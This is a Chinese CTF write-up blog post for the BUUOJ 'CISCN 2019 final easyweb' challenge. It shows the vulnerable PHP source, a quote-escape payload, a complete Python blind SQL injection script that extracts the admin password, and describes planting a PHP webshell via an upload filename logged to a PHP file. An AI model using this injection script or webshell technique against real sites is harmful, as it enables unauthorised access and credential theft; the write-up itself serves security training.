@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="在buu上刷题刷到这个，发现还没找到一个比较详细的wp，决定写一下 线上环境：http://web66.buuoj.cn docker：https://github.com/glzjin/CISCN_2019_Final_12_Day2_Web1 ps：buu好像最近上了奇安信的waf，导致注入脚本被ban了，只能自己搭个docker接着打 知识点 信息收集+源码泄露 addslashes的错误使">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUOJ ciscn final easyweb">
+<meta property="og:url" content="http://yoursite.com/2019/08/07/2019-ciscn-final-easyweb/index.html">
+<meta property="og:site_name" content="Moyu&#39;s blog">
+<meta property="og:description" content="在buu上刷题刷到这个，发现还没找到一个比较详细的wp，决定写一下 线上环境：http://web66.buuoj.cn docker：https://github.com/glzjin/CISCN_2019_Final_12_Day2_Web1 ps：buu好像最近上了奇安信的waf，导致注入脚本被ban了，只能自己搭个docker接着打 知识点 信息收集+源码泄露 addslashes的错误使">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/08/07/2019-ciscn-final-easyweb/1565185732828.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/07/2019-ciscn-final-easyweb/1565186128215.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/07/2019-ciscn-final-easyweb/1565186340532.png">
+<meta property="og:updated_time" content="2019-08-07T14:02:41.207Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BUUOJ ciscn final easyweb">
+<meta name="twitter:description" content="在buu上刷题刷到这个，发现还没找到一个比较详细的wp，决定写一下 线上环境：http://web66.buuoj.cn docker：https://github.com/glzjin/CISCN_2019_Final_12_Day2_Web1 ps：buu好像最近上了奇安信的waf，导致注入脚本被ban了，只能自己搭个docker接着打 知识点 信息收集+源码泄露 addslashes的错误使">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/07/2019-ciscn-final-easyweb/1565185732828.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/07/2019-ciscn-final-easyweb/">
+
+
+
+
+
+  <title>BUUOJ ciscn final easyweb | Moyu's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Moyu's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/07/2019-ciscn-final-easyweb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Moyu">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/wlp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyu's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BUUOJ ciscn final easyweb</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-07T21:31:39+08:00">
+                2019-08-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  745
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在buu上刷题刷到这个，发现还没找到一个比较详细的wp，决定写一下</p>
+<p>线上环境：<a href="http://web66.buuoj.cn/" target="_blank" rel="noopener">http://web66.buuoj.cn</a></p>
+<p>docker：<a href="https://github.com/glzjin/CISCN_2019_Final_12_Day2_Web1" target="_blank" rel="noopener">https://github.com/glzjin/CISCN_2019_Final_12_Day2_Web1</a></p>
+<p>ps：buu好像最近上了奇安信的waf，导致注入脚本被ban了，只能自己搭个docker接着打</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>信息收集+源码泄露</li>
+<li><code>addslashes</code>的错误使用导致单引号逃逸</li>
+<li>sql盲注</li>
+<li>php短标签写shell</li>
+</ul>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>首先扫一下路径，可以知道有<code>robots.txt</code>，提示源码泄露，经过乱翻，找到了image.php的备份文件，可以审一下源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line">$sql=<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/load/i"</span>,$sql))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"What's your problem?"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$result=mysqli_query($con,$sql);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"><span class="comment">//secure the path</span></span><br><span class="line">$count=preg_match(<span class="string">"/(\.\.)|(config)/i"</span>,$row[<span class="string">"path"</span>]);</span><br><span class="line"><span class="keyword">if</span> ($count&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"What's your problem?"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，对<code>$id</code>和<code>$path</code>进行了addslashes，但是多此一举地又使用了str_replace，根据经验，这里一定是可以绕过的</p>
+<p>经过思考，逃逸单引号的payload为<code>\0&#39;</code>，经过addslashes之后是<code>\\0\&#39;</code>，再str_replace之后是<code>\</code>，会将sql中的$id后边的单引号转义，就可以在$path参数处进行sql注入了，根据有无图片返回可以写出如下布尔盲注的脚本，注意单引号已经被过滤，所以可以采用编码绕过的方式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://x.x.x.x/image.php?id=-1%\\0'&amp;path=%20union%20select%20*%20from%20images%20where%20id=1%20and "</span></span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(<span class="string">"round:"</span>+str(i))</span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;=high):</span><br><span class="line">        mid = (low+high)/<span class="number">2</span></span><br><span class="line">        database = <span class="string">"select database()"</span> <span class="comment">#ciscn</span></span><br><span class="line">        table = <span class="string">"select group_concat(table_name) from information_schema.tables where table_schema=database()"</span> <span class="comment">#images,users</span></span><br><span class="line">        column = <span class="string">"select group_concat(column_name) from information_schema.columns where table_name=0x696d61676573"</span> <span class="comment"># username,password</span></span><br><span class="line">        flag = <span class="string">"select group_concat(password) from users where username=0x61646d696e"</span></span><br><span class="line">        payload = <span class="string">"(ascii(substr(("</span>+flag+<span class="string">"),"</span>+str(i)+<span class="string">",1)))&gt;"</span>+str(mid)+<span class="string">" %23"</span></span><br><span class="line">        payload = url + payload</span><br><span class="line">        result = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> (len(result.content)&gt;<span class="number">0</span>):</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid<span class="number">-1</span></span><br><span class="line">        </span><br><span class="line">    temp = temp + chr(int(round((low+high+<span class="number">1</span>)/<span class="number">2</span>)))</span><br><span class="line">    print(temp.ljust(<span class="number">50</span>, <span class="string">'*'</span>))</span><br></pre></td></tr></table></figure>
+
+<p>得到账号密码就可以登录了，ps：这里我还以为要搜一下md5，结果直接就是密码，这和明文传输有什么区别</p>
+<p>登录之后是个文件上传</p>
+<p><img src="1565185732828.png" alt="1565185732828"></p>
+<p>可以先测一下，随便上传点东西，返回一句话，告诉你把文件名记录在日志里了，这里原题需要脑洞，buu已经直接把日志路径给你了，所以访问一下就可以看到日志</p>
+<p>因为是把文件名保存在日志中，而且日志文件还是php，所以可以直接文件名写shell，ps：感觉实际应该不会有这种操作，有点为了出题而出题的感觉</p>
+<p>尝试搞一个文件名为php一句话木马的jpg，结果常规的被拦了，可以使用短标签绕过</p>
+<p><img src="1565186128215.png" alt="1565186128215"></p>
+<p>可以看到短标签的shell已经成功写进去了，直接读flag</p>
+<p><img src="1565186340532.png" alt="1565186340532"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/04/2019-delctf/" rel="next" title="delctf 2019 web 部分writeup">
+                <i class="fa fa-chevron-left"></i> delctf 2019 web 部分writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/wlp.jpg" alt="Moyu">
+            
+              <p class="site-author-name" itemprop="name">Moyu</p>
+              <p class="site-description motion-element" itemprop="description">hack for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#知识点"><span class="nav-number">1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现过程"><span class="nav-number">2.</span> <span class="nav-text">复现过程</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Moyu</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
